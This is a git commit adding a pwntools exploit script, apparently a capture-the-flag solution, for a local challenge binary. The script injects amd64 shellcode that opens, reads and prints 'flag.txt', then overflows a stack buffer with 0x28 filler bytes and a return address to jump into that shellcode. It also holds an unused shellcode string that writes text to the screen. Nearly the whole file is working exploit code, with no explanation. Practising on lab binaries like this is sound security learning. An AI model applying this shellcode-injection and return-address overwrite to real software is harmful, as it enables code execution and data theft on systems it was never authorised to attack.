3078ad58efd68e66f5a2706cb69097a2cfed8415
Srijiith S <65584265+ZilchGl1tch@users.noreply.github.com>
2020-12-02 19:45:30 +0530

    Create ret2shellcode.py

---
+++ ret2shellcode/ret2shellcode.py
@@ -0,0 +1,39 @@
+from pwn import *
+import binascii
+
+printst = "\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe6\xff\xff\xff\x5a\x69\x6c\x63\x68\x47\x6c\x74\x63\x68\x00"
+
+context.arch = "amd64"
+
+shellcode = asm(""" 
+mov rax,2 
+mov rsi,4
+mov rdi,0x404170
+syscall
+
+mov rdi,rax
+mov rdx,24
+mov rax,0
+lea rsi,[rsp+0x32]
+syscall
+
+mov rax,1
+mov rdi,1
+mov rdx,24
+lea rsi,[rsp+0x32]
+syscall
+
+mov rax,60
+syscall
+""").ljust(0x100,'\x00') + "flag.txt\x00"
+
+context.terminal = ['kitty', '-e', 'sh', '-c']
+io = process('./challs/chall(1)')
+
+print(io.recv().decode())
+io.sendline(shellcode)
+print(io.recv().decode())
+#gdb.attach(io)
+io.sendline('A' * 0x28 + '\x70\x40\x40\x00\x00')
+#io.interactive()
+print(io.recv().decode())
